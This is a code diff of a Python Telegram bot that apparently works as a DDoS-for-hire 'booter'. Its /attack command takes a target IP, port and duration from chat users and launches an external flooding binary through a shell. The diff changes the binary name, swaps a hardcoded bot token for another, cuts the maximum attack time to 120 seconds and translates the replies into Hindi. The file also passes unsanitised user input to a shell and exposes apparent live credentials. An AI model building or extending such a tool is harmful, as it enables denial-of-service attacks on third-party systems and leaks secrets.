@@ -6,7 +6,7 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('6913030366:AAEtMr3xpYaioIzEk7iYT_Mio7YgXrEjluE')
+bot = telebot.TeleBot('7275048595:AAEUmiY1AYw7bWyy2EvaETdpfTMdinhhpNg')
 
 # Admin user IDs
 admin_id = {"7383077317"}
@@ -201,7 +201,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"Flooding parameters set : {target}:{port} for {time}\nAttack Running Don't put same ip port"
+    response = f"हमला हो रहा है : {target}:{port} for {time}\nहमला चल रहा है एक ही आईपी पोर्ट मत डालो"
     bot.reply_to(message, response)
 
     # Dictionary to store the last time each user ran the /attack command
@@ -229,16 +229,16 @@ def handle_attack(message):
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 601:
-                response = "Error: Time interval must be less than 600."
+            if time > 121:
+                response = "Error: Time interval must be less than 120."
             else:
 
                 record_command_logs(user_id, '/attack', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./SOULCRACK {target} {port} {time}"
+                full_command = f"./mrin {target} {port} {time} 1800"
                 subprocess.run(full_command, shell=True)
-                response = f"Flooding Complete"
+                response = f"हो गया"
         else:
             response = "Usage :- /attack <target> <port> <time>"  # Updated command syntax
     else:
